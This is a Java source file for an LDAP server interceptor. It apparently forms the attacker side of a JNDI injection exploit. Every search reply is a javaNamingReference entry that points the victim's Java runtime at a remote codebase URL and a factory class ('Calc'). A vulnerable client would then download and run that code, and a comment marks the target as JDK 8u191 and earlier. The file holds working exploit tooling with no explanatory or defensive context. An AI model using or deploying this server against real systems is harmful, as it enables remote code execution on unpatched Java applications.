import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.ParseException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

public class OperationInterceptor extends InMemoryOperationInterceptor {

    private URL codebase;


    /**
     *
     */
    public OperationInterceptor(URL cb) {
        this.codebase = cb;
    }


    /**
     * {@inheritDoc}
     *
     * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
     */
    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String base = result.getRequest().getBaseDN();
        Entry e = new Entry(base);
        try {
            sendResult(result, base, e);
        } catch (Exception e1) {
            e1.printStackTrace();
        }

    }


    protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e)
        throws LDAPException, MalformedURLException {
        URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(""));
        System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
        e.addAttribute("javaClassName", "Calc");
        String cbstring = this.codebase.toString();
        int refPos = cbstring.indexOf('#');
        if (refPos > 0) {
            cbstring = cbstring.substring(0, refPos);
        }
        //todo <= jdk8u191
        e.addAttribute("javaCodeBase", cbstring);
        e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
        e.addAttribute("javaFactory", this.codebase.getRef());
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

}